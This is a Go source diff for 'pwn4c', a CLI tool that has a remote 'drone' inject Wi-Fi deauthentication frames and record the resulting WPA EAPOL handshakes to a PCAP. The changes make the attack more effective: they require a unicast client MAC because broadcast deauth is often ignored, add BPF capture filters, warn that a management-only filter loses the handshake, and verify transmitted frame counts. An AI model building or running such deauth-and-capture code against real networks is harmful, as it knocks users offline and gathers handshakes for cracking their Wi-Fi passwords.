@@ -2,6 +2,7 @@ package cmd
 
 import (
 	"fmt"
+	"net"
 	"os"
 	"time"
 
@@ -10,14 +11,17 @@ import (
 )
 
 var (
-	deauthBSSID    string
-	deauthClient   string
-	deauthCount    int
-	deauthInterval int
-	deauthChannel  int
-	deauthTarget   string
-	deauthMonitor  bool
-	deauthOut      string
+	deauthBSSID       string
+	deauthClient      string
+	deauthCount       int
+	deauthInterval    int
+	deauthChannel     int
+	deauthTarget      string
+	deauthMonitor     bool
+	deauthOut         string
+	deauthAllClients  bool
+	deauthFilterBSSID string
+	deauthMgmtOnly    bool
 )
 
 var deauthCmd = &cobra.Command{
@@ -29,7 +33,11 @@ to inject them over the air.
 Use --monitor to keep the session alive after the burst and stream the
 aftermath (probe requests, re-associations, EAPOL handshakes) straight into a
 PCAP file — the classic deauth-and-listen workflow in a single command:
-  pwn4c deauth -b AA:BB:CC:DD:EE:FF -i 6 --monitor -o handshake.pcap`,
+  pwn4c deauth -b AA:BB:CC:DD:EE:FF -c 12:22:33:44:55:66 -i 6 --monitor -o handshake.pcap
+
+Broadcast deauth frames are ignored by most clients, so --monitor refuses the
+broadcast default and requires the client MAC (-c). Pass --all-clients only if
+you deliberately want a broadcast burst.`,
 	Args: cobra.MaximumNArgs(1),
 	Run: func(cmd *cobra.Command, args []string) {
 		target := deauthTarget
@@ -51,6 +59,43 @@ PCAP file — the classic deauth-and-listen workflow in a single command:
 		if deauthBSSID == "" {
 			fmt.Println("[!] Error: Target AP BSSID is required (--bssid / -b).")
 			os.Exit(1)
+		}
+
+		// Broadcast deauth is the single most common reason a handshake capture
+		// comes back empty: clients are allowed to ignore group-addressed
+		// deauth frames, so they stay associated and never re-handshake.
+		if deauthMonitor && isBroadcastMAC(deauthClient) && !deauthAllClients {
+			fmt.Println("[!] Refusing a broadcast deauth with --monitor.")
+			fmt.Println("    Most clients ignore broadcast deauth frames, so the capture")
+			fmt.Println("    would look valid but contain no handshake.")
+			fmt.Println("    Pass the associated client MAC with -c <MAC>, or add")
+			fmt.Println("    --all-clients if you really want a broadcast burst.")
+			os.Exit(1)
+		}
+
+		if !isBroadcastMAC(deauthClient) && isGroupMAC(deauthClient) {
+			fmt.Println("[!] Client MAC is a group/multicast address; deauth needs a")
+			fmt.Println("    unicast client MAC (e.g. 12:22:33:44:55:66).")
+			os.Exit(1)
+		}
+
+		if !deauthMonitor && (deauthFilterBSSID != "" || deauthMgmtOnly) {
+			fmt.Println("[!] --filter-bssid / --mgmt-only only apply to --monitor captures.")
+			os.Exit(1)
+		}
+
+		if deauthFilterBSSID != "" {
+			hw, err := net.ParseMAC(deauthFilterBSSID)
+			if err != nil || len(hw) != 6 {
+				fmt.Printf("[!] Invalid --filter-bssid MAC %q (need 6 octets)\n", deauthFilterBSSID)
+				os.Exit(1)
+			}
+		}
+
+		if deauthMonitor && deauthMgmtOnly {
+			fmt.Println("[!] Warning: --mgmt-only drops EAPOL data frames, so the")
+			fmt.Println("    4-way handshake will not be in the capture. Use")
+			fmt.Println("    --filter-bssid instead when the goal is a handshake.")
 		}
 
 		// 1. Build the Deauth packet
@@ -107,23 +152,25 @@ PCAP file — the classic deauth-and-listen workflow in a single command:
 // explicitly before the control session closes. Closing the session while
 // frames are still queued is what used to knock the drone over.
 func runPlainDeauth(client *drone.ControlClient, frameHex string, weStartedMonitor bool) {
-	destLabel := deauthClient
-	if destLabel == "" || destLabel == "ff:ff:ff:ff:ff:ff" {
-		destLabel = "Broadcast (All Clients)"
-	}
+	destLabel := clientLabel(deauthClient)
 
 	fmt.Printf("[+] Injecting %d deauth frames (Interval: %dms)...\n", deauthCount, deauthInterval)
 	fmt.Printf("    AP (BSSID) : %s\n", deauthBSSID)
 	fmt.Printf("    Client     : %s\n", destLabel)
 	fmt.Printf("    Channel    : %d\n", deauthChannel)
+	if isBroadcastMAC(deauthClient) {
+		fmt.Println("    Note       : most clients ignore broadcast deauth; -c <MAC> targets one client.")
+	}
 
+	txBefore, txBeforeOK := readTxFrames(client)
 	sent, queued, failed, err := client.SendInjection(frameHex, deauthCount, deauthInterval)
 	if err != nil {
 		fmt.Printf("[!] Injection failed: %v\n", err)
 		os.Exit(1)
 	}
 
-	fmt.Printf("[+] Injection accepted. Transmitted: %d, Queued: %d, Failed: %d\n", sent, queued, failed)
+	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, failed: %d)\n",
+		queued, sent, failed)
 
 	if queued > 0 {
 		fmt.Println("[*] Waiting for the drone TX queue to drain...")
@@ -132,14 +179,73 @@ func runPlainDeauth(client *drone.ControlClient, frameHex string, weStartedMonit
 			fmt.Println("    The drone may have reset — run `pwn4c discover` and check its uptime.")
 			return
 		}
-		fmt.Println("[+] TX queue drained — all frames left the air.")
 	}
+
+	reportTxDelta(client, txBefore, txBeforeOK, sent+queued)
 
 	if weStartedMonitor {
 		if err := client.StopMonitor(); err != nil {
 			fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
 		}
 	}
+}
+
+// isBroadcastMAC reports whether the address is the group-addressed broadcast
+// MAC. An empty string is treated as broadcast because that is what
+// BuildDeauthFrame substitutes.
+func isBroadcastMAC(mac string) bool {
+	if mac == "" {
+		return true
+	}
+	hw, err := net.ParseMAC(mac)
+	if err != nil || len(hw) != 6 {
+		return false
+	}
+	for _, b := range hw {
+		if b != 0xff {
+			return false
+		}
+	}
+	return true
+}
+
+func clientLabel(mac string) string {
+	if isBroadcastMAC(mac) {
+		return "Broadcast (All Clients)"
+	}
+	return mac
+}
+
+// isGroupMAC reports whether the address has the I/G bit set (multicast or
+// broadcast). Such an address is never a valid single-client deauth target.
+func isGroupMAC(mac string) bool {
+	hw, err := net.ParseMAC(mac)
+	if err != nil || len(hw) != 6 {
+		return false
+	}
+	return hw[0]&0x01 != 0
+}
+
+// readTxFrames samples the drone's cumulative TX counter. The boolean is false
+// when telemetry is unavailable, so callers can fall back to a neutral message.
+func readTxFrames(client *drone.ControlClient) (uint64, bool) {
+	st, err := client.GetStatus()
+	if err != nil {
+		return 0, false
+	}
+	return st.TxFrames, true
+}
+
+// reportTxDelta compares the TX counter before the burst with the counter after
+// the queue drained, so the CLI reports frames that actually left the radio
+// instead of only the synchronous writes.
+func reportTxDelta(client *drone.ControlClient, before uint64, beforeOK bool, expected int) {
+	after, afterOK := readTxFrames(client)
+	if !beforeOK || !afterOK || after < before {
+		fmt.Printf("[+] Burst complete — %d frame(s) handed to the radio.\n", expected)
+		return
+	}
+	fmt.Printf("[+] TX frames on air: +%d (expected %d)\n", after-before, expected)
 }
 
 // waitForTxDrain polls drone telemetry until the injection queue is empty (or
@@ -165,13 +271,16 @@ func waitForTxDrain(client *drone.ControlClient, maxWait time.Duration) error {
 
 func init() {
 	deauthCmd.Flags().StringVarP(&deauthBSSID, "bssid", "b", "", "Target Access Point BSSID (e.g. AA:BB:CC:DD:EE:FF)")
-	deauthCmd.Flags().StringVarP(&deauthClient, "client", "c", "ff:ff:ff:ff:ff:ff", "Target Client MAC address (defaults to broadcast)")
+	deauthCmd.Flags().StringVarP(&deauthClient, "client", "c", "ff:ff:ff:ff:ff:ff", "Target Client MAC address (required with --monitor)")
 	deauthCmd.Flags().IntVarP(&deauthChannel, "channel", "i", 1, "Wi-Fi channel of the target AP (1-13)")
 	deauthCmd.Flags().IntVarP(&deauthCount, "count", "n", 10, "Number of deauth frames to transmit")
 	deauthCmd.Flags().IntVar(&deauthInterval, "interval", 10, "Interval between transmissions in milliseconds")
 	deauthCmd.Flags().StringVarP(&deauthTarget, "target", "t", "", "Drone IP address")
 	deauthCmd.Flags().BoolVar(&deauthMonitor, "monitor", false, "Keep listening after the burst and write the aftermath to a PCAP (handshake capture)")
 	deauthCmd.Flags().StringVarP(&deauthOut, "out", "o", "", "PCAP output file for --monitor (default: handshake.pcap)")
+	deauthCmd.Flags().BoolVar(&deauthAllClients, "all-clients", false, "Allow a broadcast deauth with --monitor (clients usually ignore it)")
+	deauthCmd.Flags().StringVar(&deauthFilterBSSID, "filter-bssid", "", "Kernel BPF filter: capture only frames for this BSSID (with --monitor)")
+	deauthCmd.Flags().BoolVar(&deauthMgmtOnly, "mgmt-only", false, "Kernel BPF filter: management frames only (with --monitor)")
 	_ = deauthCmd.MarkFlagRequired("bssid")
 
 	rootCmd.AddCommand(deauthCmd)
